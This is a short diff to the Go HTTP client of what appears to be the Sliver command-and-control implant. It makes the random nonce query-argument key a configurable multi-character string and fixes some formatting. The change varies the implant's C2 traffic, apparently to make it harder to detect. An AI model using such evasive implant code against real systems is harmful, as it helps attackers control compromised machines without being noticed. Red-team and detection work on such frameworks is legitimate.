@@ -50,6 +50,7 @@ var (
 
 	userAgent          = "{{GenerateUserAgent}}"
 	NonceQueryArgChars = "{{.HTTPC2ImplantConfig.NonceQueryArgChars}}" // "abcdefghijklmnopqrstuvwxyz"
+	NonceQueryLength   = "{{.HTTPC2ImplantConfig.NonceQueryLength}}"   // 8
 
 	ErrClosed                             = errors.New("http session closed")
 	ErrStatusCodeUnexpected               = errors.New("unexpected http response code")
@@ -197,7 +198,11 @@ func (s *SliverHTTPClient) SessionInit() error {
 // NonceQueryArgument - Adds a nonce query argument to the URL
 func (s *SliverHTTPClient) NonceQueryArgument(uri *url.URL, value uint64) *url.URL {
 	values := uri.Query()
-	key := NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))]
+	var key string
+	length, _ := strconv.Atoi(NonceQueryLength)
+	for i := 0; i < length; i++ {
+		key += string(NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))])
+	}
 	argValue := fmt.Sprintf("%d", value)
 	for i := 0; i < insecureRand.Intn(3); i++ {
 		index := insecureRand.Intn(len(argValue))
@@ -283,7 +288,7 @@ func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.R
 	}
 	queryParams := req.URL.Query()
 	for _, param := range extraURLParams {
-		if len(param.Method)>0 && param.Method != method {
+		if len(param.Method) > 0 && param.Method != method {
 			continue
 		}
 		probability, _ := strconv.Atoi(param.Probability)
